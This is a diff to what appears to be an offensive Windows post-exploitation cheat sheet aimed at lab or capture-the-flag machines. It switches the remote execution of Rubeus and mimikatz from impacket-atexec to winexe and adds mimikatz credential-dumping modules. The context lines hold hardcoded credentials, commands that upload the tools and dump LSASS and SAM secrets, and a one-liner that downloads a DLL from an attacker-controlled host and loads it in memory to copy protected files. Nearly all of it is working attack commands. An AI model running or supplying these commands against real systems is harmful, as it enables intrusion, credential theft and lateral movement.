@@ -1762,13 +1762,19 @@ Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsof
 (nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy --local-auth; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET) | tee dump_$TARGET
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"'
-Invoke-Command -ComputerName SRV01 -ScriptBlock { C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"}
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::secrets
+vault::list
+vault::cred /patch
+sekurlsa::dpapi
 
 +---------- LAPS (Execute Commands) ----------+
 $computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { hostname; whoami; ipconfig /all }
@@ -1780,13 +1786,19 @@ Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { reg add 
 (nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy --local-auth; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET) | tee dump_$TARGET
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
-impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"'
-Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit" }
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::secrets
+vault::list
+vault::cred /patch
+sekurlsa::dpapi
 
 +---------- SeBackupPrivilege ----------+
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:53/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
